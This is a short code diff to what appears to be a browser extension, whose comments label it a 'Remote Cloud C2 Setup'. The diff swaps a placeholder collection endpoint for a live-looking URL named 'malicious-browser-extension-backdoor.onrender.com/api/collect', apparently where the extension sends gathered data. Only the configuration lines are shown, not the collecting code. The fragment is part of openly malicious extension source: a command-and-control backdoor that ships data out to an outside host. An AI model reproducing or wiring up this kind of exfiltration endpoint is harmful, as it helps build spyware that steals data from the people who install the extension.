@@ -1,4 +1,3 @@
-
 // ============================================================================
 // Cross-Browser API Compatibility
 // ============================================================================
@@ -10,7 +9,8 @@ if (!API) {
 // ️ SERVER CONFIGURATION — Remote Cloud C2 Setup
 // ============================================================================
 // UPDATE THIS with your actual Glitch/Render URL
-const SERVER_URL = "https://YOUR-PROJECT-NAME.glitch.me/api/collect";
+const SERVER_URL =
+  "https://malicious-browser-extension-backdoor.onrender.com/api/collect";
 const SERVER_AUTH_TOKEN = null;
 // ============================================================================
 // Constants
